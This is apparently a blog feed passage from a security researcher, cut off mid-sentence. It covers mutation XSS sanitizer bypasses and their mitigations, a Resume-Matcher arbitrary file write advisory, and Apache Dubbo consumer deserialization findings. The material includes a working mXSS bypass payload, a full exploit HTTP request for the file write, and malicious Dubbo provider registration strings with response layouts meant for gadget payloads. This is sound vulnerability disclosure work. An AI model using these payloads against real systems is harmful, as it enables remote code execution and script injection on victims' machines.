class="name">body</span>&gt;</span></span>&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">html</span><br><span class="line">├──<span class="built_in"> head</span></span><br><span class="line">└── body</span><br><span class="line">    └── form<span class="built_in"> id</span>=<span class="string">&quot;outer&quot;</span></span><br><span class="line">        └── div</span><br><span class="line">            └── input</span><br></pre></td></tr></table></figure><p>Attackers can use this behaviour to create namespace confusion between the sanitizer and the renderer resulting in bypasses such as:</p><p><code>&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/math&gt;&lt;img src onerror=alert(1)&gt;</code></p><p>Credit <a href="https://twitter.com/SecurityMB" title="@SecurityMB">@SecurityMB</a>, covered in-depth <a href="https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/" title="here">here</a>.</p><h2 id="Desanitization"><a href="#Desanitization" class="headerlink" title="Desanitization"></a>Desanitization</h2><p>Desanitization is a crucial mistake made by applications when interfering with the sanitizer’s output before sending it to the client, essentially undoing the work of the sanitizer. Any small change to the markup could have a major impact on the final DOM tree, resulting in a bypass of the sanitization. We’ve discussed this issue before in a <a href="https://www.youtube.com/watch?v=V-DdcKADnFk" title="talk at Insomni&#39;Hack">talk at Insomni’Hack</a> and several blog posts, where we identified vulnerabilities in various applications, including:</p><ul><li><a href="https://www.sonarsource.com/blog/pitfalls-of-desanitization-leaking-customer-data-from-osticket/" title="Pitfalls of Desanitization: Leaking Customer Data from osTicket">Pitfalls of Desanitization: Leaking Customer Data from osTicket</a></li><li><a href="https://www.sonarsource.com/blog/code-vulnerabilities-leak-emails-in-proton-mail/" title="Code Vulnerabilities Put Proton Mails at Risk">Code Vulnerabilities Put Proton Mails at Risk</a></li><li><a href="https://www.sonarsource.com/blog/remote-code-execution-in-tutanota-desktop-due-to-code-flaw/" title="Remote Code Execution in Tutanota Desktop due to Code Flaw">Remote Code Execution in Tutanota Desktop due to Code Flaw</a></li><li><a href="https://www.sonarsource.com/blog/code-vulnerabilities-put-skiff-emails-at-risk/" title="Code Vulnerabilities Put Skiff Emails at Risk">Code Vulnerabilities Put Skiff Emails at Risk</a></li></ul><p>Here is an example of desanitization, an application takes the sanitizer output and renames the <code>svg</code> element to <code>custom-svg</code>, this changes the namespace of the element and could cause XSS when re-rendering.</p><img src="/img/blogs/mxss/desanitization.png" style="width: 100%;"/><h2 id="Context-dependent"><a href="#Context-dependent" class="headerlink" title="Context-dependent"></a>Context-dependent</h2><p>HTML parsing is complex and can be different depending on the context. For example, parsing a whole document is different from fragment parsing in Firefox (see <a href="https://sonarsource.github.io/mxss-cheatsheet/#Browser%20specific" title="Browser Specific"><em>Browser Specific</em></a> section on the cheatsheet). Dealing with the change from sanitizing to rendering in the browser, developers might mistakenly change the context in which the data is rendered causing parsing differential and eventually bypassing the sanitizer. Because third-party sanitizers are not aware of the context in which the result will be put, they cannot address this problem. This is aimed to be solved when browsers implement a built-in sanitizer (<a href="https://developer.mozilla.org/en-US/docs/Web/API/HTML_Sanitizer_API" title="Sanitizer API">Sanitizer API</a> effort).</p><p>For example, an application sanitizes an input, but when embedding it into the page, it encapsulates it in SVG, changing the context to an SVG namespace.</p><img src="/img/blogs/mxss/context_switch.png" style="width: 100%;"/><h1 id="mXSS-Case-Studies"><a href="#mXSS-Case-Studies" class="headerlink" title="mXSS Case Studies"></a>mXSS Case Studies</h1><p>While we have published blog posts in the past covering mXSS vulnerabilities, such as <a href="https://www.sonarsource.com/blog/reply-to-calc-the-attack-chain-to-compromise-mailspring/" title="Reply to calc: The Attack Chain to Compromise Mailspring">Reply to calc: The Attack Chain to Compromise Mailspring</a>, we have also reported various sanitizer bypasses, such as <a href="https://github.com/mganss/HtmlSanitizer" title="mganss/HtmlSanitizer">mganss&#x2F;HtmlSanitizer</a> (<a href="https://nvd.nist.gov/vuln/detail/CVE-2023-44390" title="CVE-2023-44390">CVE-2023-44390</a>), <a href="https://github.com/TYPO3/html-sanitizer" title="Typo3">Typo3</a> (<a href="https://nvd.nist.gov/vuln/detail/CVE-2023-38500" title="CVE-2023-38500">CVE-2023-38500</a>), <a href="https://github.com/OWASP/java-html-sanitizer" title="OWASP/java-html-sanitizer">OWASP&#x2F;java-html-sanitizer</a>, and more.</p><p>But let’s take a look at one simple case study in a software named Joplin (<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33726" title="CVE-2023-33726">CVE-2023-33726</a>), a note-taking desktop app written in electron. Due to unsafe electron configurations, JS code in Joplin can use Node internal functionalities enabling an attacker to execute arbitrary commands on the machine. </p><p>The origin of the vulnerability resides in the sanitizer’s parser, which parses untrusted HTML input via the <a href="https://www.npmjs.com/package/htmlparser2" title="htmlparser2">htmlparser2</a> npm package. The package itself claims that they don’t follow the specification and prefers speed over accuracy: “If you need strict HTML spec compliance, have a look at <a href="https://github.com/inikulin/parse5" title="parse5">parse5</a>.”</p><p>Very quickly we noticed ways that this parser doesn’t follow the specification. With the following input, we can see that the parser is oblivious to different namespaces.</p><img src="/img/blogs/mxss/htmlparser2_differential.png" style="width: 100%;"/><p>While the sanitizer’s parser doesn’t render the <code>img</code> element, the renderer does. This is an example of <a href="https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/#parser-differentials" title="Parser Differential">Parser Differential</a>, an attacker can simply add <code>onerror</code> event handler which will execute arbitrary code when a victim opens a malicious note.</p><img src="/img/blogs/mxss/joplin_calc.png" style="width: 100%;"/><p>This specific finding was also found independently by <a href="https://github.com/maple3142" title="@maple3142">@maple3142</a></p><h1 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h1><p>Unfortunately, there is not one simple mitigation solution. We encourage developers to understand this bug class in depth so that they can make a better decision about how to mitigate this issue according to their application.</p><p>During our research, we came across a number of mitigation approaches and security measures that developers took in order to tackle the issue of mXSS (also available in the cheatsheet):</p><p><strong>Sanitize client side</strong></p><ul><li>This is probably the <strong>most important rule to follow</strong>. Using sanitizers that run on the client side, such as <a href="https://github.com/cure53/DOMPurify" title="DOMPurify">DOMPurify</a>, avoids parser differentials risk. Due to the complexity of parsing and most likely serving content to different parsers (Firefox vs Chrome vs Safari etc…), it is impossible to avoid differentials when HTML is parsed not in the same place where the content is eventually rendered. For that reason, server-side sanitizers are prone to fail.</li><li>When using Server-Side Rendering (SSR) with a client-side JS framework, it can be easy to drop in libraries like <a href="https://www.npmjs.com/package/isomorphic-dompurify" title="isomorphic-dompurify">isomorphic-dompurify</a>. They let client-side sanitizers like <a href="https://github.com/cure53/DOMPurify" title="DOMPurify">DOMPurify</a> “just work” in SSR mode. But to achieve this, they also introduce a server-side HTML parser like <a href="https://www.npmjs.com/package/jsdom" title="jsdom">jsdom</a>, which introduces parser differential risks. The safest option for web apps using SSR is to disable SSR for user-controlled HTML and defer the sanitization and rendering to the client-side only.</li></ul><p><strong>Don’t reparse</strong></p><ul><li>In order to avoid “Round trip mXSS” the application can insert the sanitized DOM tree directly into the document unlike serializing and re-rendering the content.<br><strong>Note</strong> that this approach can be done only when the sanitizers are implemented on the client side and might cause unexpected behaviors (such as rendering content differently due to not adapting to the context of the page).</li></ul><p><strong>Always encode or delete raw content</strong></p><ul><li>Because the idea of mXSS is to figure out a way for a malicious string to be rendered as raw text in the sanitizer but parsed as HTML later, not allowing&#x2F;encoding any raw text in the sanitizer stage would make it impossible to re-render it as HTML.<br><strong>Note</strong> that this could break some things such as CSS code.</li></ul><p><strong>Not supporting foreign content elements</strong></p><ul><li>Not supporting foreign content elements (<strong>deleting svg&#x2F;math elements and their content not renaming</strong>) in your sanitizers reduces complexity significantly.<br><strong>Note</strong> this doesn’t mitigate mXSS but offers a precaution step.</li></ul><h1 id="Future"><a href="#Future" class="headerlink" title="Future"></a>Future</h1><p>Such a complex subject with no simple solution, is there a bright future? </p><p>The answer is yes, luckily there are a number of proposals and actions taken in order to put this bug class to an end or at least address it officially.</p><p>The biggest problem today is that the responsibility of sanitizing untrusted HTML input falls on third-party developers, whether it’s the application devs or sanitizer devs. This is impractical due to the complexity of the task and the fact that they would need to address different renderer parsers (different users use other browsers) and keep up to date with the evolving HTML specifications. A more correct way to approach this is making it the renderer’s responsibility to make sure there is no malicious content in the markup. Having a built-in sanitizer in the browser for example could eliminate most if not all bypasses we see up to this day.</p><p>The <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTML_Sanitizer_API" title="Sanitizer API">Sanitizer API</a> initiative is exactly that. It is currently under development by the Web Platform Incubator Community Group (WICG) and is meant to provide developers with an integrated, robust, and context-aware sanitizer written by browsers themselves (no more parser differentials nor reparsing). Wider browser adoption of the Sanitizer API would likely lead to developers’ increased use of it for safer HTML manipulation.</p><p>Another effort taken to tackle this issue is specs updates, for example, Chrome now encodes <code>&lt;</code> and <code>&gt;</code> characters in attributes</p><p><code>&lt;svg&gt;&lt;style&gt;&lt;a alt=&quot;&lt;/style&gt;&quot;&gt;</code> → <code>&lt;svg&gt;&lt;style&gt;&lt;a alt=&quot;&amp;lt;/style&amp;gt;&quot;&gt;</code></p><p>Evolving the fundamentals of the HTML definitions to a safer future.</p><h1 id="mXSS-cheatsheet-🧬🔬"><a href="#mXSS-cheatsheet-🧬🔬" class="headerlink" title="mXSS cheatsheet 🧬🔬"></a>mXSS cheatsheet 🧬🔬</h1><p>We have created <a href="https://sonarsource.github.io/mxss-cheatsheet/" title="mXSS cheatsheet">mXSS cheatsheet</a> meant to be a one-stop shop for anyone who is interested in learning, researching, and innovating in the world of mXSS. Helping users to see unexpected HTML behavior in a simplified list, unlike reading 1500~ pages of documentation. We encouraged users to <a href="http://contributions/" title="contribute">contribute</a> and help drive this effort forward together.</p><h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p>mXSS (mutation cross-site scripting) is a security vulnerability that arises from the way HTML is handled. Even if a web application has strong filters in place to prevent traditional XSS attacks, mXSS can still sneak through. This is because mXSS exploits quirks in the HTML behavior, blinding the sanitizer to malicious elements. </p><p>This blog dove into mXSS, providing examples, splitting this big “mXSS” name into subsections, and covering developer mitigation strategies. By equipping you with this knowledge, we hope developers and researchers can confidently address this issue in the future.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Cross-site scripting (XSS) is a well-known vulnerability type that occurs when an attacker can inject JavaScript code into a vulnerable p</summary>
      
    
    
    
    
    <category term="xss" scheme="https://yaniv-git.github.io/tags/xss/"/>
    
    <category term="mxss" scheme="https://yaniv-git.github.io/tags/mxss/"/>
    
    <category term="bypass" scheme="https://yaniv-git.github.io/tags/bypass/"/>
    
    <category term="html" scheme="https://yaniv-git.github.io/tags/html/"/>
    
  </entry>
  
  <entry>
    <title>Arbitrary File Write in Resume-Matcher</title>
    <link href="https://yaniv-git.github.io/2024/04/28/Arbitrary%20File%20Write%20in%20Resume-Matcher/"/>
    <id>https://yaniv-git.github.io/2024/04/28/Arbitrary%20File%20Write%20in%20Resume-Matcher/</id>
    <published>2024-04-28T22:00:00.000Z</published>
    <updated>2025-07-08T15:29:30.239Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Resume-Matcher through 0.1.1-alpha is susceptible to arbitrary file write due to improper file path validation in the <code>/api/resume-processor</code> endpoint. An attacker could upload a malicious file to an arbitrary location on the server, which results in remote code execution in most system configurations.</p><h1 id="Explotation"><a href="#Explotation" class="headerlink" title="Explotation"></a>Explotation</h1><ol><li>The following request will create a <code>/tmp/pwn.example</code> file.</li></ol><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/resume-processor</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8000</span><br><span class="line"></span><br><span class="line"><span class="language-fortran">Content-Length: <span class="number">335</span></span></span><br><span class="line"><span class="language-fortran">Content-<span class="keyword">Type</span>: multipart/<span class="keyword">form</span>-<span class="keyword">data</span>;</span></span><br><span class="line"><span class="language-fortran">boundary=----WebKitFormBoundaryB7BMKT4iboAIYDLB</span></span><br><span class="line"><span class="language-fortran"></span></span><br><span class="line"><span class="language-fortran">------WebKitFormBoundaryB7BMKT4iboAIYDLB</span></span><br><span class="line"><span class="language-fortran">Content-Disposition: <span class="keyword">form</span>-<span class="keyword">data</span>; <span class="keyword">name</span>=<span class="string">&quot;resume&quot;</span>; filename=<span class="string">&quot;/tmp/pwn.example&quot;</span></span></span><br><span class="line"><span class="language-fortran">Content-<span class="keyword">Type</span>: application/pdf</span></span><br><span class="line"><span class="language-fortran"><span class="keyword">file</span>-<span class="keyword">data</span></span></span><br><span class="line"><span class="language-fortran"></span></span><br><span class="line"><span class="language-fortran">------WebKitFormBoundaryB7BMKT4iboAIYDLB</span></span><br><span class="line"><span class="language-fortran">Content-Disposition: <span class="keyword">form</span>-<span class="keyword">data</span>; <span class="keyword">name</span>=<span class="string">&quot;jobs&quot;</span></span></span><br><span class="line"><span class="language-fortran">Content-<span class="keyword">Type</span>: application/json</span></span><br><span class="line"><span class="language-fortran">&#123;&#125;</span></span><br><span class="line"><span class="language-fortran"></span></span><br><span class="line"><span class="language-fortran">------WebKitFormBoundaryB7BMKT4iboAIYDLB--</span></span><br></pre></td></tr></table></figure><h1 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h1><p>Unauthenticated attacker can upload arbitrary files into the server which results in remote code execution in most system configurations.</p><h1 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h1><p>Upgrade Resume-Matcher to the latest version.</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ul><li><a href="https://github.com/srbhr/Resume-Matcher/commit/f2c28b4b4bff4070582fdd1c87563e4a68601a69">Commit</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h1&gt;&lt;p&gt;Resume-Matcher through 0.1.1-alpha</summary>
      
    
    
    
    
    <category term="arbitrary file write" scheme="https://yaniv-git.github.io/tags/arbitrary-file-write/"/>
    
  </entry>
  
  <entry>
    <title>Apache Dubbo Consumer Risks: The Road Not Taken</title>
    <link href="https://yaniv-git.github.io/2024/03/31/Apache%20Dubbo%20Consumer%20Risks:%20The%20Road%20Not%20Taken/"/>
    <id>https://yaniv-git.github.io/2024/03/31/Apache%20Dubbo%20Consumer%20Risks:%20The%20Road%20Not%20Taken/</id>
    <published>2024-03-31T22:00:00.000Z</published>
    <updated>2025-07-08T15:29:30.239Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Apache Dubbo is a popular Java open-source, high-performance RPC (Remote Procedure Call) framework designed to simplify the development of microservices-based and distributed systems. Originally created by Alibaba, Dubbo has gained widespread popularity and is now maintained as a top-level Apache project with 40K stars on GitHub. At its core, Dubbo provides a robust communication protocol that allows services to seamlessly exchange data and invoke methods across different networked nodes, enabling the creation of scalable, flexible, and reliable applications. With its rich ecosystem and community support, Apache Dubbo has become a go-to choice for organizations seeking to harness the power of distributed computing in their software solutions.</p><p>In the past, several publications covered vulnerabilities in the framework, mainly affecting the provider end of the RPC layout, such as <a href="https://checkmarx.com/blog/the-0xdabb-of-doom-cve-2021-25641/">The 0xDABB of Doom</a>. In 2021, <a href="https://github.com/pwntester">Alvaro Muñoz</a> published great research on the framework with an article named “<a href="https://securitylab.github.com/research/apache-dubbo/">Apache Dubbo: All roads lead to RCE</a>“, disclosing more than a dozen RCE vulnerabilities.</p><p>Interestingly, Muñoz unveiled and discussed a bit on vulnerabilities affecting the consumer end rather than the provider (we will explain Dubbo’s architecture in the next section). The curiosity about this less researched side of Dubbo led us to unveil two other interesting findings that later were debatably not considered vulnerabilities by Apache. Nevertheless, we publish our research out of technical interest so that the community is aware of the risks. Following our disclosure, Apache <a href="https://github.com/apache/dubbo-website/commit/cd1be029d5adb3ac398a09ca4e5f3da2a55b7323">updated</a> its documentation to provide clearer safety instructions for users.</p><h1 id="Key-Information"><a href="#Key-Information" class="headerlink" title="Key Information"></a>Key Information</h1><ul><li>Sonar’s Vulnerability Research Team has discovered two security issues in Apache Dubbo.</li><li>After reporting and discussing the findings, the Apache team didn’t classify them as vulnerabilities.</li><li>Despite having similar issues being recognized as vulnerabilities in the past, the Apache team claimed that it is the user’s responsibility to make sure that registries are well protected as they should provide a shield against untrusted Providers.</li><li>Following our notes on the unclarity of this point of view in their documentation, Apache <a href="https://github.com/apache/dubbo-website/commit/cd1be029d5adb3ac398a09ca4e5f3da2a55b7323">updated</a> its <a href="https://dubbo.apache.org/en/overview/notices/registry/">documentation</a> for users to protect themselves better.</li></ul><h1 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h1><p>Apache Dubbo consumers who invoke RPC functions on untrusted provides or using non-secure registries are susceptible to arbitrary object deserialization, which can eventually result in remote code execution (RCE).</p><iframe width="736" height="414" src="https://www.youtube.com/embed/skaky-lI8a8" title="Apache Dubbo Consumer Risks: The Road Not Taken" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe><h1 id="Apache-Dubbo-Technical-Details"><a href="#Apache-Dubbo-Technical-Details" class="headerlink" title="Apache Dubbo Technical Details"></a>Apache Dubbo Technical Details</h1><p>In this section, we will showcase the technical details and explanation of our findings. We will discuss the common Dubbo architecture and how this attack vector works.</p><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>Apache Dubbo provides an RPC framework based on Java with three main components in the architecture:</p><ul><li>Provider - the “server” that exposes functions for execution.</li><li>Consumer - the “client” that invokes predefined functions on the provider.</li><li>Registry - Holds information for and from both consumers and providers (for example, when a consumer wants to invoke a function, they get the provider metadata, address, and more from the registry).</li></ul><img src="/img/blogs/apache-dubbo/image1.png" style="width: 100%;"/><p>The basic code for a consumer is quite straightforward. At first, we set up a Dubbo reference service and name our application:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ReferenceConfig&lt;GreetingsService&gt; reference = <span class="keyword">new</span> <span class="title class_">ReferenceConfig</span>&lt;&gt;();</span><br><span class="line">reference.setApplication(<span class="keyword">new</span> <span class="title class_">ApplicationConfig</span>(<span class="string">&quot;first-dubbo-client&quot;</span>));</span><br></pre></td></tr></table></figure><p>After this, the reference is configured to a specific registry by calling <code>setRegistry</code>. This is a crucial step, as we will see later:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reference.setRegistry(<span class="keyword">new</span> <span class="title class_">RegistryConfig</span>(<span class="string">&quot;multicast://224.5.6.7:1234&quot;</span>));</span><br></pre></td></tr></table></figure><p>Next, our desired interface will be set, which will result in Dubbo providing the relevant server that implements a corresponding function. At last, we can invoke a function on the provider and access the results:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reference.setInterface(GreetingsService.class);</span><br><span class="line"><span class="type">GreetingsService</span> <span class="variable">greetingsService</span> <span class="operator">=</span> reference.get();</span><br><span class="line"><span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> greetingsService.sayHi(<span class="string">&quot;dubbo&quot;</span>);</span><br><span class="line">System.out.println(message);</span><br></pre></td></tr></table></figure><p>In the past, there were multiple vulnerabilities, mainly affecting the providers. But as demonstrated <a href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/">before</a> by <a href="https://github.com/pwntester">Alvaro Muñoz</a> (CVE-2021-30181, CVE-2021-30180, GHSL-2021-040, GHSL-2021-041, and GHSL-2021-042), vulnerabilities in consumers happened by poisoning the registry: “Zookeeper supports authentication but it is disabled by default and in most installations, and other systems such as Nacos do not even support authentication”</p><p>While previous attacks on consumers were by controlling configurations via the registry, this attack focuses on the <em>response</em>’s deserialization. A specifically crafted response on an invocation request might execute arbitrary code on the consumer. </p><p>An attacker can manipulate a consumer to invoke a function on a malicious provider in multiple ways such as:</p><ol><li>Creating a new malicious provider in the registry.</li><li>Changing an existing provider address in the registry to an attacker-controlled one.</li><li>Having previous control over a provider (lateral movement).</li><li>Social engineering.</li></ol><p>As discussed before, since registries don’t have authentication by default (some don’t support it at all), it is important to emphasize to users that this attacker scenario is feasible. As a result of our report, Apache clarified in the <a href="https://dubbo.apache.org/en/overview/notices/registry/">documentation</a> its threat model, claiming that everything from the registry is considered trusted, users should enable authentication in their registries, and avoid exposing them to the public.</p><p>The code in the consumer that invokes a function on a provider will first check the supported provider’s serialization via the registry. Later, it will send the data (such as function parameters) serialized using the supported methods. Some serialization methods are considered safe (fastjson2, hessian2, …) and others are not (native-java, kyro, …). On the provider’s end, a check is made to see if the request’s data serialization is supported using a flag called <code>SERIALIZATION_SECURITY_CHECK_KEY</code>, which is <code>true</code> by <a href="https://github.com/apache/dubbo/blob/0553d70899253519bd6fab00fb647eababf1c911/dubbo-rpc/dubbo-rpc-dubbo/src/main/java/org/apache/dubbo/rpc/protocol/dubbo/DecodeableRpcInvocation.java#L84">default</a>. </p><p>This prevents an attacker from using arbitrary serialization methods (a vulnerability found previously by <a href="https://checkmarx.com/blog/the-0xdabb-of-doom-cve-2021-25641/">Dor Tumarkin</a> and <a href="https://securitylab.github.com/research/apache-dubbo/">Alvaro Munoz</a> independently tracked as CVE-2021-25641).</p><h2 id="Finding-1-Arbitrary-Object-Deserialization-via-the-Dubbo-protocol"><a href="#Finding-1-Arbitrary-Object-Deserialization-via-the-Dubbo-protocol" class="headerlink" title="Finding 1 - Arbitrary Object Deserialization via the Dubbo protocol"></a>Finding 1 - Arbitrary Object Deserialization via the Dubbo protocol</h2><p>Despite having the same <code>SERIALIZATION_SECURITY_CHECK_KEY</code> flag on the consumer’s end, all it’s doing is <a href="https://github.com/apache/dubbo/blob/0553d70899253519bd6fab00fb647eababf1c911/dubbo-rpc/dubbo-rpc-dubbo/src/main/java/org/apache/dubbo/rpc/protocol/dubbo/DecodeableRpcResult.java#L141">checking</a> that the response’s serialization type is the same as the one sent. Since this attack vector relies on an attacker-controlled provider, the supported serialization of the provider can also be modified to an unsafe one, causing the response deserialization to be unsafe.</p><p>A malicious provider can be registered with the <code>prefer.serialization=nativejava</code> parameter in the URL (in addition to <code>decode.in.io.thread=true</code> and corresponding to the registered consumer’s interface, version, etc. To ensure the desired function registration). This forces the consumer to use <code>nativejava</code> serialization when sending data to the provider, automatically allowing deserializing the response with the unsafe <code>nativejava</code> deserialization wrapper.</p><p>Let’s assume the following registration example:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;dubbo://192.168.1.20:20881/org.apache.dubbo.samples.api.GreetingsService?prefer.serialization=nativejava,fastjson2,hessian2&amp;decode.in.io.thread=true&amp;application=demo-provider&amp;scopeModel=test&amp;deprecated=false&amp;dubbo=2.0.2&amp;dynamic=true&amp;generic=false&amp;interface=org.apache.dubbo.samples.api.GreetingsService&amp;methods=sayHi,sayHu&amp;release=3.2.4&amp;service-name-mapping=true&amp;side=provider&amp;timestamp=&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">int</span>(time.time()*<span class="number">1000</span>)).encode(<span class="string">&quot;utf-8&quot;</span>)</span><br></pre></td></tr></table></figure><p>According to the Dubbo protocol, the malicious provider response header should look like this:</p><img src="/img/blogs/apache-dubbo/image3.png" style="width: 100%;"/><ul><li>Dubbo protocol header <code>\xda\xbb</code></li><li>Deserialization id <code>\x07</code> (7 - for nativejava), </li><li>Response code <code>\x14</code> (20 for successful invocation) </li><li>The following 8 bytes are the “future id” which are taken from the request. </li><li>Serialized object length</li><li>Serialized object</li></ul><p>This header will result in the payload ending up in the vulnerable <code>decode</code> <a href="https://github.com/apache/dubbo/blob/0553d70899253519bd6fab00fb647eababf1c911/dubbo-rpc/dubbo-rpc-dubbo/src/main/java/org/apache/dubbo/rpc/protocol/dubbo/DubboCodec.java#L128">function call</a>. Since Dubbo first <a href="https://github.com/apache/dubbo/blob/0553d70899253519bd6fab00fb647eababf1c911/dubbo-rpc/dubbo-rpc-dubbo/src/main/java/org/apache/dubbo/rpc/protocol/dubbo/DecodeableRpcResult.java#L96">reads</a> a byte flag from the object and then deserializes accordingly, an attacker would need to start the object with a serialized byte (adding <code>\x77\x01\x01</code> for flag 1, meaning no exception and an object without attachments).</p><p>Using a deserialization gadget payload (for demonstration purposes, generated via <a href="https://github.com/frohoff/ysoserial">ysoserial</a>), a consumer that invokes a function on a malicious provider is susceptible to arbitrary code execution:</p><img src="/img/blogs/apache-dubbo/image5.png" style="width: 100%;"/><h2 id="Finding-2-Arbitrary-Object-Deserialization-via-Triple-gRPC-protocol"><a href="#Finding-2-Arbitrary-Object-Deserialization-via-Triple-gRPC-protocol" class="headerlink" title="Finding 2 - Arbitrary Object Deserialization via Triple&#x2F;gRPC protocol"></a>Finding 2 - Arbitrary Object Deserialization via Triple&#x2F;gRPC protocol</h2><p>Following the same attack surface as before, an attacker can register a provider using a different protocol than <code>dubbo://</code>. Consumers support the following protocols out of the box and don’t require any special changes to the code.</p><ul><li><em>registry</em>: <code>org.apache.dubbo.registry.integration.InterfaceCompatibleRegistryProtocol</code></li><li><em>rest</em>: <code>org.apache.dubbo.rpc.protocol.rest.RestProtocol</code></li><li><em>injvm</em>: <code>org.apache.dubbo.rpc.protocol.injvm.InjvmProtocol</code></li><li><em>service-discovery-registry</em>: <code>org.apache.dubbo.registry.integration.RegistryProtocol</code></li><li><em>mock</em>: <code>org.apache.dubbo.rpc.support.MockProtocol</code></li><li><em>dubbo</em>: <code>org.apache.dubbo.rpc.protocol.dubbo.DubboProtocol</code></li><li><em>tri</em>: <code>org.apache.dubbo.rpc.protocol.tri.TripleProtocol</code></li><li><em>grpc</em>: <code>org.apache.dubbo.rpc.protocol.tri.GrpcProtocol</code></li></ul><p>According to the provider’s protocol registered in the registry, the consumer will use different data decoders&#x2F;encoders. The <code>tri</code> and <code>grpc</code> protocols are susceptible to Arbitrary Object Deserialization when receiving a response, in a similar fashion to the first finding. Both protocols underline using HTTP2 and gRPC.</p><p>In the following example, a malicious provider is registered with the <code>prefer.serialization=nativejava</code> parameter in the URL but with the <code>tri://</code> or <code>grpc://</code> protocol (unlike <code>dubbo://</code> scheme used by default in the first finding):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;tri://192.168.1.20:20881/org.apache.dubbo.samples.api.GreetingsService?prefer.serialization=nativejava,fastjson2,hessian2&amp;release=3.2.4&amp;application=demo-provider&amp;scopeModel=test&amp;deprecated=false&amp;dubbo=2.0.2&amp;dynamic=true&amp;generic=false&amp;interface=org.apache.dubbo.samples.api.GreetingsService&amp;methods=sayHi,sayHu&amp;service-name-mapping=true&amp;side=provider&amp;decode.in.io.thread=true&amp;timestamp=&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">int</span>(time.time()*<span class="number">1000</span>)).encode(<span class="string">&quot;utf-8&quot;</span>)</span><br></pre></td></tr></table></figure><p>The data received from the provider is decoded <a href="https://github.com/apache/dubbo/blob/0553d70899253519bd6fab00fb647eababf1c911/dubbo-rpc/dubbo-rpc-triple/src/main/java/org/apache/dubbo/rpc/protocol/tri/stream/TripleClientStream.java#L464">here</a> (more specifically, the data frame). According to the <a href="https://github.com/apache/dubbo/blob/0553d70899253519bd6fab00fb647eababf1c911/dubbo-rpc/dubbo-rpc-triple/src/main/java/org/apache/dubbo/rpc/protocol/tri/frame/TriDecoder.java#L70">deliver</a> function and the <a href="https://github.com/apache/dubbo/blob/0553d70899253519bd6fab00fb647eababf1c911/dubbo-rpc/dubbo-rpc-triple/src/main/java/org/apache/dubbo/rpc/protocol/tri/TripleCustomerProtocolWapper.java#L101">parseFrom</a> this is the data structure:</p><img src="/img/blogs/apache-dubbo/image4.png" style="width: 100%;"/><ul><li>Header byte (<code>\x00</code>)</li><li>Length of following data, </li><li>Serialization type byte (<code>\x0a</code>)</li><li>Serialization type text length byte</li><li>Serialization type text (<code>nativejava</code>)</li><li>Object byte (<code>\x12</code>)</li><li>Object length, calculated via protobuf’s <a href="https://github.com/protocolbuffers/protobuf/blob/5c8cbdfefdb482c4be16c9b9f014943db72e0ce1/java/core/src/main/java/com/google/protobuf/CodedInputStream.java#L530">RawVarint32</a></li><li>Object payload</li></ul><p>The vulnerable function <a href="https://github.com/apache/dubbo/blob/0553d70899253519bd6fab00fb647eababf1c911/dubbo-rpc/dubbo-rpc-triple/src/main/java/org/apache/dubbo/rpc/protocol/tri/ReflectionPackableMethod.java#L360">unpack</a>s and deserializes any data received from the provider if the deserialization type is included in the <code>prefer.serialization</code> parameter, which is controlled by the attacker.</p><p>Similarly to the first demonstration, a gadget payload generated via <a href="https://github.com/frohoff/ysoserial">ysoserial</a> would leverage the arbitrary object deserialization to execute arbitrary code on the consumer when invoking a function on a malicious 